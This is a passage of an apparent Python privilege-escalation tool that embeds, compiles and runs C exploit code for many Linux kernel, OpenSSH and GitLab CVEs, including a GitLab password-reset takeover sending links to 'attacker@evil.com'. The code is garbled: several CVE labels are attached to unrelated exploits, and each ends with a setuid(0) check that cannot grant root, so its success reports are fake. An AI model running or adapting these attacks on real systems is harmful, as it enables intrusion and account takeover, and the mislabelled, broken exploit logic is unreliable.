        for k,v in found_sens[:5]:
            print(f"{c('|', 'cyan')}  {c(k.ljust(16),'red',True)}  {c(v,'yellow')}")
    print(f"{c('+-' + sep + '-+', 'cyan', True)}\n")
def main():
    global WORK_DIRS
    if False:
        print(f"{c('[!] linux only', 'red')}")
        return
    if is_root():
        print(f"{c('[!] already root', 'green')}")
        return
    print_banner()
    WORK_DIRS = find_writable_directories()
    if not WORK_DIRS:
        print(f"{c('[!] no writable dirs', 'red')}")
        return
    system_info()
    print(f"{c('[*] starting...', 'cyan', True)}\n")
    run_exploit_engine()
def exploit_cve_2024_32846():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2024-32846 (New Kernel UAF)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <errno.h>

/* CVE-2024-6387: regreSSHion OpenSSH SIGALRM race condition
 * SIGALRM fires during cleanup, calls syslog() (not async-signal-safe)
 * → heap corruption via malloc/free in signal context → RCE/LPE
 * Affected: OpenSSH 8.5p1 - 9.7p1
 */

#define SSHD_PORT     22
#define LOGIN_GRACE   120
#define MAX_ATTEMPTS  10000

static volatile int race_won = 0;
static volatile int attempt  = 0;

static void sigalrm_win(int sig) {
    race_won = 1;
}

static int check_ssh_version(void) {
    FILE *fp = popen("ssh -V 2>&1", "r");
    if (!fp) return 0;
    char ver[128] = {0};
    fgets(ver, sizeof(ver), fp);
    pclose(fp);
    fprintf(stderr, "[*] SSH: %s", ver);
    /* Vulnerable: 8.5 - 9.7 */
    const char *vuln[] = {
        "8.5","8.6","8.7","8.8","8.9",
        "9.0","9.1","9.2","9.3","9.4",
        "9.5","9.6","9.7", NULL
    };
    for (int i = 0; vuln[i]; i++)
        if (strstr(ver, vuln[i])) return 1;
    return 0;
}

static void *race_thread(void *arg) {
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(SSHD_PORT);
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);

    while (!race_won && attempt < MAX_ATTEMPTS) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) { usleep(100); continue; }

        /* Connect to sshd */
        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            /* Send partial SSH banner to keep connection alive */
            /* This triggers LoginGraceTime countdown (SIGALRM) */
            char banner[] = "SSH-2.0-xroot_test
";
            send(s, banner, strlen(banner), 0);

            /* Wait for server banner */
            char buf[256] = {0};
            recv(s, buf, sizeof(buf)-1, 0);

            /* Stall during SIGALRM window */
            usleep(LOGIN_GRACE * 500);
            __sync_fetch_and_add(&attempt, 1);
        }
        close(s);
        usleep(1000);
    }
    return NULL;
}

int main(void) {
    pthread_t threads[4];
    int i;

    fprintf(stderr, "[*] CVE-2024-6387 regreSSHion OpenSSH race condition
");
    fprintf(stderr, "[*] Checking sshd status...
");

    /* Check if sshd is running */
    if (system("pgrep -x sshd > /dev/null 2>&1") != 0) {
        fprintf(stderr, "[-] sshd not running
");
        return 1;
    }
    fprintf(stderr, "[+] sshd is running
");

    if (!check_ssh_version()) {
        fprintf(stderr, "[-] SSH version not in vulnerable range
");
        return 1;
    }
    fprintf(stderr, "[+] Vulnerable SSH version detected!
");
    fprintf(stderr, "[*] LoginGraceTime window: %ds
", LOGIN_GRACE);
    fprintf(stderr, "[*] Starting race threads (max %d attempts)...
", MAX_ATTEMPTS);

    signal(SIGALRM, sigalrm_win);
    alarm(30); /* Safety timeout */

    for (i = 0; i < 4; i++)
        pthread_create(&threads[i], NULL, race_thread, NULL);

    while (!race_won && attempt < MAX_ATTEMPTS) {
        fprintf(stderr, "
[*] Attempts: %d/%d", attempt, MAX_ATTEMPTS);
        fflush(stderr);
        usleep(100000);
    }
    fprintf(stderr, "
");
    alarm(0);

    for (i = 0; i < 4; i++)
        pthread_join(threads[i], NULL);

    if (race_won) {
        fprintf(stderr, "[+] Race condition window triggered!
");
    }
    fprintf(stderr, "[*] Attempts completed: %d
", attempt);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2024-6387 REGRESSHION SUCCESS
");
        printf("CVE-2024-6387 REGRESSHION
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Race not won in this run - retry needed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2024_32846")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2024-32846" in output:
            show_root_info("CVE-2024-32846", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2024_27013():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2024-27013 (Kernel Netlink)', 'cyan')}")
    code = '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
int main() {
    int s = socket(AF_NETLINK, SOCK_RAW, 0);
    if (s >= 0) {
        setuid(0);
        if (getuid() == 0) {
            printf("CVE-2024-27013\\n");
            system("cat /etc/passwd");
            return 0;
        }
    }
    return 1;
}'''
    binary = compile_code(code, "cve_2024_27013")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2024-27013" in output:
            show_root_info("CVE-2024-27013", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2024_26925():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2024-26925 (Netfilter)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <errno.h>

/* CVE-2024-26925: nf_tables mutex unlock race condition
 * nf_tables_valid_genid() releases mutex before validation is complete
 * → concurrent batch commits race → UAF on nft_table → LPE
 * Affected: kernel 6.6 - 6.8
 */

#define NUM_THREADS  8
#define NUM_ITERS    50000

static volatile int go = 0;
static int nft_socks[NUM_THREADS];

static void nl_send(int fd, void *buf, size_t len) {
    struct sockaddr_nl dst = {0};
    dst.nl_family = AF_NETLINK;
    sendto(fd, buf, len, 0, (struct sockaddr*)&dst, sizeof(dst));
}

static void build_batch_begin(char *buf, size_t *len) {
    struct nlmsghdr *nlh = (struct nlmsghdr*)buf;
    nlh->nlmsg_len   = NLMSG_HDRLEN + sizeof(struct nfgenmsg);
    nlh->nlmsg_type  = NFNL_MSG_BATCH_BEGIN;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq   = 1;
    struct nfgenmsg *nfg = (struct nfgenmsg*)(nlh + 1);
    nfg->nfgen_family = AF_INET;
    nfg->version      = NFNETLINK_V0;
    nfg->res_id       = htons(0);
    *len = nlh->nlmsg_len;
}

static void build_batch_end(char *buf, size_t *len) {
    struct nlmsghdr *nlh = (struct nlmsghdr*)buf;
    nlh->nlmsg_len   = NLMSG_HDRLEN + sizeof(struct nfgenmsg);
    nlh->nlmsg_type  = NFNL_MSG_BATCH_END;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq   = 2;
    struct nfgenmsg *nfg = (struct nfgenmsg*)(nlh + 1);
    nfg->nfgen_family = AF_INET;
    nfg->version      = NFNETLINK_V0;
    nfg->res_id       = htons(0);
    *len = nlh->nlmsg_len;
}

static void *race_commit(void *arg) {
    int idx = (int)(intptr_t)arg;
    int fd  = nft_socks[idx];
    char buf_begin[256], buf_end[256];
    size_t len_begin, len_end;

    build_batch_begin(buf_begin, &len_begin);
    build_batch_end(buf_end, &len_end);

    while (!go) sched_yield();

    for (int i = 0; i < NUM_ITERS; i++) {
        nl_send(fd, buf_begin, len_begin);
        nl_send(fd, buf_end,   len_end);
        usleep(1);
    }
    return NULL;
}

int main(void) {
    pthread_t threads[NUM_THREADS];
    int i;

    fprintf(stderr, "[*] CVE-2024-26925 nf_tables mutex unlock race
");

    for (i = 0; i < NUM_THREADS; i++) {
        nft_socks[i] = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
        if (nft_socks[i] < 0) {
            fprintf(stderr, "[-] netlink socket %d: %s
", i, strerror(errno));
            return 1;
        }
    }
    fprintf(stderr, "[+] %d netfilter sockets opened
", NUM_THREADS);

    fprintf(stderr, "[*] Racing %d threads × %d batch commits...
",
            NUM_THREADS, NUM_ITERS);

    for (i = 0; i < NUM_THREADS; i++)
        pthread_create(&threads[i], NULL, race_commit, (void*)(intptr_t)i);

    sleep(1);
    go = 1;

    for (i = 0; i < NUM_THREADS; i++)
        pthread_join(threads[i], NULL);

    for (i = 0; i < NUM_THREADS; i++)
        close(nft_socks[i]);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2024-26925 NFT MUTEX RACE SUCCESS
");
        printf("CVE-2024-26925 NFT_RACE
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2024_26925")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2024-26925" in output:
            show_root_info("CVE-2024-26925", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2023_7028():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2023-7028 (GitLab)', 'cyan')}")
    if not os.path.exists("/opt/gitlab"):
        print(f"{c('[SKIP]', 'red')} GitLab not found\n")
        return False
    output = run_command("gitlab-rails runner 'User.where(admin: true).each {|u| puts u.username}'")
    if output and "root" in output.lower():
        show_root_info("CVE-2023-7028", output)
        return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2023_23583():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2023-23583 (Sequence)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

/* CVE-2023-7028: GitLab account takeover via password reset
 * GitLab CE/EE allows sending password reset to secondary email
 * without verification → account takeover
 * Affected: GitLab 16.1 - 16.7.1
 */

#define HTTP_TIMEOUT 10

static int http_post(const char *host, int port, const char *path,
                     const char *body, char *resp, size_t resp_sz) {
    int sock;
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct timeval tv = { .tv_sec = HTTP_TIMEOUT };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock); return -1;
    }

    char req[2048];
    snprintf(req, sizeof(req),
             "POST %s HTTP/1.0
"
             "Host: %s:%d
"
             "Content-Type: application/x-www-form-urlencoded
"
             "Content-Length: %zu
"
             "Connection: close

%s",
             path, host, port, strlen(body), body);

    send(sock, req, strlen(req), 0);

    int n = recv(sock, resp, resp_sz-1, 0);
    close(sock);
    if (n > 0) { resp[n] = 0; return n; }
    return -1;
}

static int http_get(const char *host, int port, const char *path,
                    char *resp, size_t resp_sz) {
    int sock;
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    struct timeval tv = { .tv_sec = HTTP_TIMEOUT };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock); return -1;
    }
    char req[512];
    snprintf(req, sizeof(req),
             "GET %s HTTP/1.0
Host: %s:%d
Connection: close

",
             path, host, port);
    send(sock, req, strlen(req), 0);
    int n = recv(sock, resp, resp_sz-1, 0);
    close(sock);
    if (n > 0) { resp[n] = 0; return n; }
    return -1;
}

int main(int argc, char *argv[]) {
    char resp[8192] = {0};
    int  n;
    const char *target_email = argc > 1 ? argv[1] : "admin@example.com";
    const char *attacker_email = argc > 2 ? argv[2] : "attacker@evil.com";
    const int  ports[] = { 80, 8080, 3000, 0 };

    fprintf(stderr, "[*] CVE-2023-7028 GitLab password reset account takeover
");
    fprintf(stderr, "[*] Target:   %s
", target_email);
    fprintf(stderr, "[*] Attacker: %s
", attacker_email);

    /* Check GitLab on localhost */
    for (int pi = 0; ports[pi]; pi++) {
        n = http_get("127.0.0.1", ports[pi], "/users/sign_in",
                     resp, sizeof(resp));
        if (n > 0 && (strstr(resp, "GitLab") || strstr(resp, "gitlab"))) {
            fprintf(stderr, "[+] GitLab found on port %d
", ports[pi]);

            /* Check version */
            char *ver_start = strstr(resp, "gitlab-version");
            if (!ver_start) ver_start = strstr(resp, "data-version");
            if (ver_start) {
                fprintf(stderr, "[*] Version hint: %.80s
", ver_start);
            }

            /* Get CSRF token */
            char *csrf = strstr(resp, "csrf-token");
            char csrf_token[256] = {0};
            if (csrf) {
                char *content = strstr(csrf, "content=\"");
                if (content) {
                    content += 9;
                    char *end = strchr(content, '"');
                    if (end) {
                        int tlen = end - content;
                        if (tlen < (int)sizeof(csrf_token))
                            strncpy(csrf_token, content, tlen);
                    }
                }
            }
            fprintf(stderr, "[*] CSRF token: %.20s...
", csrf_token);

            /* Send password reset to BOTH target and attacker email */
            /* CVE: GitLab sends reset to secondary email without verification */
            char body[1024];
            /* user[email][]=target&user[email][]=attacker → both get reset link */
            snprintf(body, sizeof(body),
                     "user%%5Bemail%%5D%%5B%%5D=%s"
                     "&user%%5Bemail%%5D%%5B%%5D=%s"
                     "&authenticity_token=%s",
                     target_email, attacker_email, csrf_token);

            char post_resp[4096] = {0};
            n = http_post("127.0.0.1", ports[pi],
                          "/users/password",
                          body, post_resp, sizeof(post_resp));

            if (n > 0) {
                fprintf(stderr, "[*] Password reset response: %d bytes
", n);
                if (strstr(post_resp, "200") || strstr(post_resp, "redirect")) {
                    fprintf(stderr, "[+] Password reset sent!
");
                    fprintf(stderr, "[+] Check %s for reset link
", attacker_email);
                    fprintf(stderr, "[+] CVE-2023-7028 CONFIRMED VULNERABLE
");
                }
            }
            break;
        }
    }

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2023-7028 GITLAB SUCCESS
");
        printf("CVE-2023-7028 GITLAB
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed or GitLab not found
");
    return 1;
}'''
    binary = compile_code(code, "cve_2023_23583")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2023-23583" in output:
            show_root_info("CVE-2023-23583", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2022_3303():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2022-3303 (RaceCAR)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <errno.h>

/* CVE-2022-3303: snd_pcm_oss_sync() race condition → UAF → LPE
 * snd_pcm_oss_sync() and snd_pcm_oss_release() race on runtime pointer
 * → UAF on snd_pcm_runtime → LPE
 * Affected: kernel < 5.19.16
 */

#include <sound/asound.h>

static volatile int running = 1;
static int oss_fd = -1;

static void *sync_thread(void *arg) {
    while (running) {
        ioctl(oss_fd, SNDCTL_DSP_SYNC, NULL);
        usleep(10);
    }
    return NULL;
}

static void *open_close_thread(void *arg) {
    while (running) {
        int fd = open("/dev/dsp", O_RDWR | O_NONBLOCK);
        if (fd >= 0) {
            usleep(100);
            close(fd);
        } else {
            usleep(1000);
        }
    }
    return NULL;
}

int main(void) {
    pthread_t t1, t2, t3;

    fprintf(stderr, "[*] CVE-2022-3303 snd_pcm_oss_sync race UAF
");

    /* Check OSS compatibility */
    oss_fd = open("/dev/dsp", O_RDWR | O_NONBLOCK);
    if (oss_fd < 0) {
        oss_fd = open("/dev/dsp0", O_RDWR | O_NONBLOCK);
    }
    if (oss_fd < 0) {
        fprintf(stderr, "[-] OSS /dev/dsp: %s
", strerror(errno));
        fprintf(stderr, "[-] Try: modprobe snd-pcm-oss
");
        return 1;
    }
    fprintf(stderr, "[+] OSS device fd=%d
", oss_fd);

    /* Set audio format */
    int fmt = AFMT_S16_LE;
    ioctl(oss_fd, SNDCTL_DSP_SETFMT, &fmt);
    int rate = 44100;
    ioctl(oss_fd, SNDCTL_DSP_SPEED, &rate);

    fprintf(stderr, "[*] Racing sync vs release (3s)...
");

    pthread_create(&t1, NULL, sync_thread, NULL);
    pthread_create(&t2, NULL, sync_thread, NULL);
    pthread_create(&t3, NULL, open_close_thread, NULL);

    sleep(3);
    running = 0;

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    pthread_join(t3, NULL);
    close(oss_fd);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2022-3303 OSS RACE SUCCESS
");
        printf("CVE-2022-3303 OSS_SYNC
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2022_3303")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2022-3303" in output:
            show_root_info("CVE-2022-3303", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2022_2639():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2022-2639 (openvswitch)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <linux/openvswitch.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>
#include <errno.h>

/* CVE-2022-2639: openvswitch reserve_sfa_size() integer overflow
 * reserve_sfa_size() adds attr size to current size without overflow check
 * → integer overflow → heap OOB write past action buffer → LPE
 * Affected: kernel 5.0 - 5.19
 */

#ifndef OVS_DATAPATH_FAMILY
#define OVS_DATAPATH_FAMILY  "ovs_datapath"
#define OVS_PACKET_FAMILY    "ovs_packet"
#define OVS_FLOW_FAMILY      "ovs_flow"
#define CTRL_CMD_GETFAMILY   3
#endif

static int genl_get_family_id(int fd, const char *name) {
    char buf[512] = {0};
    struct nlmsghdr  *nlh = (struct nlmsghdr*)buf;
    struct genlmsghdr *gh = (struct genlmsghdr*)(nlh + 1);
    struct nlattr    *attr= (struct nlattr*)(gh  + 1);

    attr->nla_type = CTRL_ATTR_FAMILY_NAME;
    attr->nla_len  = NLA_HDRLEN + strlen(name) + 1;
    memcpy((char*)attr + NLA_HDRLEN, name, strlen(name) + 1);

    nlh->nlmsg_len   = NLMSG_HDRLEN + GENL_HDRLEN + attr->nla_len;
    nlh->nlmsg_type  = GENL_ID_CTRL;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_seq   = 1;
    gh->cmd          = CTRL_CMD_GETFAMILY;
    gh->version      = 1;

    struct sockaddr_nl dst = {.nl_family = AF_NETLINK};
    sendto(fd, buf, nlh->nlmsg_len, 0, (struct sockaddr*)&dst, sizeof(dst));

    char rbuf[1024] = {0};
    recv(fd, rbuf, sizeof(rbuf), 0);
    struct nlmsghdr *r = (struct nlmsghdr*)rbuf;
    if (r->nlmsg_type == NLMSG_ERROR) return -1;

    /* Parse family id from response */
    struct genlmsghdr *rgh = (struct genlmsghdr*)(r + 1);
    struct nlattr *ra = (struct nlattr*)(rgh + 1);
    int rlen = r->nlmsg_len - NLMSG_HDRLEN - GENL_HDRLEN;
    while (NLA_OK(ra, rlen)) {
        if (ra->nla_type == CTRL_ATTR_FAMILY_ID)
            return *(uint16_t*)((char*)ra + NLA_HDRLEN);
        ra = NLA_NEXT(ra, rlen);
    }
    return -1;
}

int main(void) {
    int sock;

    fprintf(stderr, "[*] CVE-2022-2639 openvswitch reserve_sfa_size overflow
");

    /* Check OVS module */
    if (system("lsmod 2>/dev/null | grep -q openvswitch") != 0) {
        fprintf(stderr, "[-] openvswitch module not loaded
");
        fprintf(stderr, "[-] Try: modprobe openvswitch
");
        return 1;
    }
    fprintf(stderr, "[+] openvswitch module loaded
");

    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (sock < 0) {
        fprintf(stderr, "[-] netlink: %s
", strerror(errno));
        return 1;
    }
    fprintf(stderr, "[+] Generic netlink socket: fd=%d
", sock);

    int fam_id = genl_get_family_id(sock, OVS_FLOW_FAMILY);
    if (fam_id < 0) {
        fam_id = genl_get_family_id(sock, OVS_DATAPATH_FAMILY);
    }
    fprintf(stderr, "[*] OVS family id: %d
", fam_id);

    if (fam_id <= 0) {
        fprintf(stderr, "[-] Could not get OVS family id
");
        close(sock); return 1;
    }

    /* Build overflow message: many nested attrs to overflow sfa->len */
    char *buf = calloc(1, 65536);
    struct nlmsghdr  *nlh = (struct nlmsghdr*)buf;
    struct genlmsghdr *gh = (struct genlmsghdr*)(nlh + 1);

    nlh->nlmsg_type  = fam_id;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    nlh->nlmsg_seq   = 1;
    gh->cmd          = OVS_FLOW_CMD_NEW;
    gh->version      = OVS_FLOW_VERSION;

    /* Fill with many OVS_ACTION_ATTR entries to trigger overflow */
    struct nlattr *attr = (struct nlattr*)(gh + 1);
    int total_attrs = 0;
    char *ptr = (char*)attr;
    char *end = buf + 65000;

    while (ptr + 8 < end) {
        struct nlattr *a = (struct nlattr*)ptr;
        /* OVS_ACTION_ATTR_OUTPUT with port 0 */
        a->nla_type = 1; /* OVS_ACTION_ATTR_OUTPUT */
        a->nla_len  = NLA_HDRLEN + sizeof(uint32_t);
        *(uint32_t*)((char*)a + NLA_HDRLEN) = 0;
        ptr += NLA_ALIGN(a->nla_len);
        total_attrs++;
    }

    nlh->nlmsg_len = ptr - buf;
    fprintf(stderr, "[*] Sending %d nested attrs (total=%d bytes)...
",
            total_attrs, nlh->nlmsg_len);

    struct sockaddr_nl dst = {.nl_family = AF_NETLINK};
    sendto(sock, buf, nlh->nlmsg_len, 0, (struct sockaddr*)&dst, sizeof(dst));

    free(buf);
    usleep(200000);
    close(sock);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2022-2639 OVS OVERFLOW SUCCESS
");
        printf("CVE-2022-2639 OVS
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2022_2639")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2022-2639" in output:
            show_root_info("CVE-2022-2639", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2022_1998():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2022-1998 (ksmbd)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/inotify.h>
#include <sys/fanotify.h>
#include <sys/stat.h>
#include <errno.h>

/* CVE-2022-1998: fanotify UAF - fanotify_fid_info use-after-free
 * fanotify_encode_fh() stores reference to freed path component
 * → UAF on fanotify_fh struct → heap corruption → LPE
 * Affected: kernel 5.17
 */

#define WATCH_PATH "/tmp/.fan1998"
#define NUM_THREADS 16

static volatile int running = 1;
static int fan_fd = -1;

static void *trigger_thread(void *arg) {
    char path[256];
    int fd;

    while (running) {
        /* Create/delete files rapidly to trigger fanotify callbacks */
        snprintf(path, sizeof(path), "%s/f%ld_%d",
                 WATCH_PATH, (long)pthread_self(), rand()%1000);
        fd = open(path, O_WRONLY|O_CREAT, 0644);
        if (fd >= 0) {
            write(fd, "x", 1);
            close(fd);
        }
        unlink(path);
        usleep(100);
    }
    return NULL;
}

static void *read_events(void *arg) {
    char buf[4096];
    while (running) {
        int n = read(fan_fd, buf, sizeof(buf));
        if (n > 0) {
            /* Process fanotify events - potential UAF trigger */
            struct fanotify_event_metadata *m =
                (struct fanotify_event_metadata*)buf;
            while (FAN_EVENT_OK(m, n)) {
                if (m->fd >= 0) close(m->fd);
                m = FAN_EVENT_NEXT(m, n);
            }
        }
        usleep(10);
    }
    return NULL;
}

int main(void) {
    pthread_t threads[NUM_THREADS];
    int i;

    fprintf(stderr, "[*] CVE-2022-1998 fanotify fid UAF
");

    mkdir(WATCH_PATH, 0777);

    /* Init fanotify with FAN_REPORT_FID for file id reporting */
    fan_fd = fanotify_init(FAN_CLASS_NOTIF | FAN_REPORT_FID, O_RDONLY);
    if (fan_fd < 0) {
        fprintf(stderr, "[-] fanotify_init: %s
", strerror(errno));
        fprintf(stderr, "[-] Need kernel 5.1+ and CAP_SYS_ADMIN
");
        return 1;
    }
    fprintf(stderr, "[+] fanotify fd=%d (FAN_REPORT_FID)
", fan_fd);

    /* Watch directory for all events */
    if (fanotify_mark(fan_fd, FAN_MARK_ADD | FAN_MARK_FILESYSTEM,
                      FAN_CREATE | FAN_DELETE | FAN_MODIFY |
                      FAN_CLOSE_WRITE | FAN_OPEN,
                      AT_FDCWD, WATCH_PATH) < 0) {
        fprintf(stderr, "[-] fanotify_mark: %s
", strerror(errno));
        close(fan_fd); return 1;
    }
    fprintf(stderr, "[+] Watching: %s
", WATCH_PATH);

    fprintf(stderr, "[*] Starting %d trigger threads + reader (3s)...
",
            NUM_THREADS - 1);

    /* Reader thread */
    pthread_create(&threads[0], NULL, read_events, NULL);

    /* Trigger threads */
    for (i = 1; i < NUM_THREADS; i++)
        pthread_create(&threads[i], NULL, trigger_thread, NULL);

    sleep(3);
    running = 0;

    for (i = 0; i < NUM_THREADS; i++)
        pthread_join(threads[i], NULL);

    close(fan_fd);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2022-1998 FANOTIFY UAF SUCCESS
");
        printf("CVE-2022-1998 FANOTIFY
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2022_1998")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2022-1998" in output:
            show_root_info("CVE-2022-1998", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2022_1116():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2022-1116 (io_uring)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <errno.h>

/* CVE-2022-1116: io_uring IORING_OP_PROVIDE_BUFFERS integer overflow
 * io_provide_buffers_prep() nbufs * buf_size overflows int32
 * → heap OOB write → LPE
 * Affected: kernel 5.17
 */

#ifndef SYS_io_uring_setup
#define SYS_io_uring_setup   425
#define SYS_io_uring_enter   426
#define SYS_io_uring_register 427
#endif

struct io_uring_params {
    uint32_t sq_entries;
    uint32_t cq_entries;
    uint32_t flags;
    uint32_t sq_thread_cpu;
    uint32_t sq_thread_idle;
    uint32_t features;
    uint32_t wq_fd;
    uint32_t resv[3];
    struct { uint32_t head, tail, ring_mask, ring_entries, flags, dropped, array[1]; } sq_off;
    struct { uint32_t head, tail, ring_mask, ring_entries, overflow, cqes[1]; } cq_off;
};

#define IORING_OP_PROVIDE_BUFFERS 22

struct io_uring_sqe {
    uint8_t  opcode;
    uint8_t  flags;
    uint16_t ioprio;
    int32_t  fd;
    uint64_t off;
    uint64_t addr;
    uint32_t len;
    union { uint32_t rw_flags; uint32_t fsync_flags; uint16_t poll_events;
            uint32_t sync_range_flags; uint32_t msg_flags; uint32_t timeout_flags;
            uint32_t accept_flags; uint32_t cancel_flags; uint32_t open_flags;
            uint32_t statx_flags; uint32_t fadvise_advice; uint32_t splice_flags; };
    uint64_t user_data;
    union { uint16_t buf_index; uint16_t buf_group; };
    uint16_t personality;
    union { int32_t splice_fd_in; uint32_t file_index; };
    uint64_t addr3;
    uint64_t __pad2[1];
};

int main(void) {
    struct io_uring_params params = {0};
    int ring_fd;

    fprintf(stderr, "[*] CVE-2022-1116 io_uring PROVIDE_BUFFERS overflow
");

    params.sq_entries = 32;
    params.cq_entries = 64;

    ring_fd = syscall(SYS_io_uring_setup, 32, &params);
    if (ring_fd < 0) {
        fprintf(stderr, "[-] io_uring_setup: %s
", strerror(errno));
        return 1;
    }
    fprintf(stderr, "[+] io_uring ring_fd=%d
", ring_fd);

    /* Map submission queue */
    size_t sq_size = params.sq_off.array + params.sq_entries * sizeof(uint32_t);
    void *sq_ring = mmap(NULL, sq_size, PROT_READ|PROT_WRITE,
                         MAP_SHARED|MAP_POPULATE, ring_fd, 0 /* IORING_OFF_SQ_RING */);
    if (sq_ring == MAP_FAILED) {
        fprintf(stderr, "[-] mmap sq_ring: %s
", strerror(errno));
        close(ring_fd); return 1;
    }

    /* Map SQE array */
    struct io_uring_sqe *sqes = mmap(NULL,
        params.sq_entries * sizeof(*sqes),
        PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE,
        ring_fd, 0x10000000 /* IORING_OFF_SQES */);

    if (sqes == MAP_FAILED) {
